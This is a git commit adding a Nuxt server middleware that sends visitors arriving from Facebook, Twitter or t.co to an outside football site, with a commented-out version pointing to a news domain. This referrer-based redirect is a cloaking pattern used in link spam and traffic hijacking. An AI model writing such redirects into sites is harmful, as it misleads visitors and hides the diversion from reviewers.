32cee7295b164db8689659c0f78844883fd413df
trungseodn <trungseodn@gmail.com>
2022-09-13 11:41:51 +0700

    Ver code
    Ver code

---
+++ server/middleware/[...slug].ts
@@ -0,0 +1,19 @@
+/* export default  (req, res, next) => {
+    console.log(req.url);
+    const headers = req.headers;
+    res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
+    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
+        res.redirect("https://ufo.nepalikhabar24hour.com"+req.url);
+    } else {
+        next();
+    }
+};
+ */
+
+export default defineEventHandler((event) => {
+    const headers = event.req.headers;
+    
+    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
+        sendRedirect(event,"mstfootball.com"+event.req.url);
+    }
+})
